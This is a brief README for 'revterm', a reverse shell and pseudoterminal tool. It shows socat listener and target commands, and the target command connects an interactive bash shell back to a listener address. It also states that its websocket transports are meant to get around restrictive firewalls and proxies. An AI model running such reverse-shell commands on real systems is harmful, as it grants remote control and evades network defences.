# revterm
Reverse shell / pseudoterminal via multiple and novel transports

The idea is to provide something akin to the following:
- listener: `socat file:$(tty),raw,echo=0 tcp-listen:4444`
- target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener-addr>:4444`

But with different transports, specifically websocket and secure websockets to defeat restrictive firewalls/proxies.

